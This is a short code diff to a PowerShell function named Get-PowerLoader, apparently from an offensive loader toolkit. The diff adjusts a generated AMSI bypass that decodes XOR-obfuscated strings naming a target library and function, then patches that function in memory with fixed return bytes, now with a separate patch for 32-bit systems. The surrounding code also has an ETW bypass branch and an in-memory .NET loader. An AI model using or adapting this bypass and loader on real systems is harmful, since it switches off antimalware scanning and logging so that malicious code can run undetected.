@@ -88,7 +88,7 @@ function Get-PowerLoader {
         'AMSI' {
             $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
             $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += '$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)' + [Environment]::NewLine
+            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)} else {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)}' + [Environment]::NewLine
             $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
         }
         'ETW' {
@@ -113,7 +113,6 @@ function Get-PowerLoader {
             $srcLoader += 'Invoke-NetLoader -Code $code -ArgumentList $args'
         }
     }
-
     $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
     return [ScriptBlock]::Create($script)
 }
